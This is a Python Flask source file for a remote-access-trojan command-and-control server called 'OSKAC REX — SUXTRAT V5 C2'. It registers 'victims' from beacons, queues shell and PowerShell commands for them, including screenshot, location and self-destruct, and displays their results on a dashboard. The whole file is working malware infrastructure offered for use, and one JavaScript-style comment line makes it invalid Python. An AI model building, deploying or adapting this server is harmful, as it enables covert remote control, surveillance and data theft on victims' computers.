#!/usr/bin/env python3
# OSKAC REX — C2 SERVER (WINDOWS COMPATIBLE)

from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import sqlite3
import json
import os

app = Flask(__name__)

# Database setup
def init_db():
    conn = sqlite3.connect('suxtrat_c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id TEXT PRIMARY KEY, ip TEXT, os TEXT, 
                  first_seen TEXT, last_seen TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT,
                  command TEXT, status TEXT, result TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

# HTML Dashboard (Simplified)
DASHBOARD = '''
<!DOCTYPE html>
<html>
<head>
    <title>OSKAC REX C2</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; font-family: 'Courier New', monospace; color: #00ff41; padding: 20px; }
        h1 { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
        .stats { display: flex; gap: 15px; margin-bottom: 20px; }
        .stat-card { background: #0d0d0d; border: 1px solid #00ff41; padding: 15px; text-align: center; min-width: 120px; }
        .stat-value { font-size: 32px; font-weight: bold; }
        .main-panel { display: flex; gap: 20px; }
        .victim-list { background: #0d0d0d; border: 1px solid #2a2a2a; width: 250px; height: 400px; overflow-y: auto; }
        .victim-item { padding: 10px; border-bottom: 1px solid #1a1a1a; cursor: pointer; }
        .victim-item:hover { background: #1a1a1a; }
        .victim-item.selected { background: #0a1a0a; border-left: 3px solid #00ff41; }
        .control-panel { flex: 1; background: #0d0d0d; border: 1px solid #2a2a2a; padding: 15px; }
        .cmd-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
        .cmd-btn { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; cursor: pointer; text-align: center; }
        .cmd-btn:hover { background: #00ff41; color: #000; }
        .console { background: #000; height: 250px; overflow-y: auto; padding: 10px; font-size: 11px; margin-top: 15px; }
        .console-line { color: #0f0; padding: 2px 0; border-bottom: 1px solid #0a0a0a; }
        .input-area { display: flex; margin-top: 10px; gap: 10px; }
        input { flex: 1; background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; font-family: monospace; }
        button { background: #00ff41; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        .refresh-btn { background: #0a0a0a; border: 1px solid #00ff41; color: #00ff41; padding: 5px 10px; margin-bottom: 10px; cursor: pointer; }
        .status-online { color: #0f0; }
        .status-offline { color: #f00; }
    </style>
</head>
<body>
    <h1>🔷 OSKAC REX — SUXTRAT V5 C2 PANEL</h1>
    
    <div class="stats">
        <div class="stat-card"><div class="stat-value" id="total">0</div><div>Total Victims</div></div>
        <div class="stat-card"><div class="stat-value" id="online">0</div><div>Online</div></div>
        <div class="stat-card"><div class="stat-value" id="commands">0</div><div>Commands</div></div>
    </div>
    
    <div class="main-panel">
        <div class="victim-list">
            <div style="padding: 10px; text-align: center; border-bottom: 1px solid #2a2a2a;">
                <button class="refresh-btn" onclick="loadVictims()">🔄 REFRESH</button>
            </div>
            <div id="victimList">Loading...</div>
        </div>
        
        <div class="control-panel">
            <div class="cmd-grid">
                <div class="cmd-btn" onclick="sendCmd('systeminfo')">🖥️ INFO</div>
                <div class="cmd-btn" onclick="sendCmd('dir')">📁 DIR</div>
                <div class="cmd-btn" onclick="sendCmd('whoami')">👤 WHOAMI</div>
                <div class="cmd-btn" onclick="sendCmd('ipconfig')">🌐 IPCONFIG</div>
                <div class="cmd-btn" onclick="sendCmd('tasklist')">📋 TASKS</div>
                <div class="cmd-btn" onclick="sendCmd('screenshot')">📸 SCREEN</div>
                <div class="cmd-btn" onclick="sendCmd('location')">📍 LOCATION</div>
                <div class="cmd-btn" onclick="sendCmd('self_destruct')">💀 DESTROY</div>
            </div>
            
            <div class="console" id="console">
                <div class="console-line">[>] OSKAC REX C2 Ready</div>
                <div class="console-line">[>] Select victim from left panel</div>
            </div>
            
            <div class="input-area">
                <input type="text" id="customCmd" placeholder="Enter custom command (cmd/powershell)...">
                <button onclick="sendCustom()">EXECUTE →</button>
            </div>
        </div>
    </div>

    <script>
        let currentVictim = null;
        
        function loadVictims() {
            fetch('/api/victims')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('total').innerText = data.length;
                    document.getElementById('online').innerText = data.filter(v => v.status === 'online').length;
                    document.getElementById('commands').innerText = data.reduce((a,b) => a + (b.cmd_count || 0), 0);
                    
                    const container = document.getElementById('victimList');
                    if (data.length === 0) {
                        container.innerHTML = '<div style="padding: 20px; text-align: center; color: #555;">No victims online</div>';
                        return;
                    }
                    
                    container.innerHTML = data.map(v => `
                        <div class="victim-item ${currentVictim === v.id ? 'selected' : ''}" onclick="selectVictim('${v.id}')">
                            <div><strong>📱 ${v.id.substring(0, 25)}</strong></div>
                            <div class="${v.status === 'online' ? 'status-online' : 'status-offline'}">● ${v.status}</div>
                            <div style="font-size: 9px; color: #555;">${v.os || 'Unknown'}</div>
                        </div>
                    `).join('');
                });
        }
        
        function selectVictim(id) {
            currentVictim = id;
            addConsoleLine(`[>] Selected victim: ${id}`);
            loadVictims();
        }
        
        function sendCmd(cmd) {
            if (!currentVictim) {
                addConsoleLine('[!] Please select a victim first');
                return;
            }
            addConsoleLine(`[>] Sending command: ${cmd}`);
            
            fetch('/api/send', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({victim_id: currentVictim, command: cmd})
            }).then(() => {
                addConsoleLine(`[>] Command sent, waiting for result...`);
                checkResult();
            });
        }
        
        function sendCustom() {
            const cmd = document.getElementById('customCmd').value;
            if (cmd) {
                sendCmd(cmd);
                document.getElementById('customCmd').value = '';
            }
        }
        
        function checkResult() {
            if (!currentVictim) return;
            fetch(`/api/result/${currentVictim}`)
                .then(r => r.json())
                .then(data => {
                    if (data.result) {
                        addConsoleLine(`[<] Result:\n${data.result.substring(0, 500)}`);
                    }
                });
        }
        
        function addConsoleLine(text) {
            const console = document.getElementById('console');
            const line = document.createElement('div');
            line.className = 'console-line';
            line.innerHTML = `[${new Date().toLocaleTimeString()}] ${text.replace(/\\n/g, '<br>')}`;
            console.appendChild(line);
            console.scrollTop = console.scrollHeight;
        }
        
        loadVictims();
        setInterval(loadVictims, 5000);
        setInterval(() => { if(currentVictim) checkResult(); }, 3000);
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD)

@app.route('/api/victims')
def get_victims():
    conn = sqlite3.connect('suxtrat_c2.db')
    c = conn.cursor()
    c.execute('SELECT id, ip, os, status FROM victims ORDER BY last_seen DESC')
    victims = [{'id': r[0], 'ip': r[1], 'os': r[2], 'status': r[3]} for r in c.fetchall()]
    
    # Tambah count commands
    for v in victims:
        c.execute('SELECT COUNT(*) FROM commands WHERE victim_id = ?', (v['id'],))
        v['cmd_count'] = c.fetchone()[0]
    
    conn.close()
    return jsonify(victims)

@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.json
    victim_id = data.get('victim_id')
    ip = request.remote_addr
    os_info = data.get('os', 'Unknown')
    
    conn = sqlite3.connect('suxtrat_c2.db')
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO victims 
                 (id, ip, os, first_seen, last_seen, status) 
                 VALUES (?, ?, ?, COALESCE((SELECT first_seen FROM victims WHERE id=?), ?), ?, 'online')''',
              (victim_id, ip, os_info, victim_id, datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    
    # Get pending commands
    c.execute('SELECT id, command FROM commands WHERE victim_id = ? AND status = "pending"', (victim_id,))
    pending = c.fetchall()
    conn.close()
    
    return jsonify({'commands': [{'id': cmd[0], 'command': cmd[1]} for cmd in pending]})

@app.route('/api/send', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get('victim_id')
    command = data.get('command')
    
    conn = sqlite3.connect('suxtrat_c2.db')
    c = conn.cursor()
    c.execute('INSERT INTO commands (victim_id, command, status, timestamp) VALUES (?, ?, ?, ?)',
              (victim_id, command, 'pending', datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'ok'})

@app.route('/api/result/<victim_id>') //salah satunya kena  value di sini jadi ini nya bakal nembah ({masukannya})
def get_result(victim_id):
    conn = sqlite3.connect('suxtrat_c2.db')
    c = conn.cursor()
    c.execute('SELECT id, command, result FROM commands WHERE victim_id = ? AND status = "completed" AND result IS NOT NULL ORDER BY id DESC LIMIT 1', (victim_id,))
    row = c.fetchone()
    if row:
        # Mark as read (optional)
        pass
    conn.close()
    
    if row:
        return jsonify({'command_id': row[0], 'command': row[1], 'result': row[2]})
    return jsonify({'result': None})

@app.route('/api/result/update', methods=['POST'])
def update_result():
    data = request.json
    command_id = data.get('command_id')
    result = data.get('result')
    victim_id = data.get('victim_id')
    
    conn = sqlite3.connect('suxtrat_c2.db')
    c = conn.cursor()
    c.execute('UPDATE commands SET status = "completed", result = ? WHERE id = ?', (result, command_id))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    print("\n" + "="*50)
    print("   OSKAC REX — SUXTRAT V5 C2 SERVER")
    print("   Dashboard: http://127.0.0.1:5000")
    print("="*50 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=False)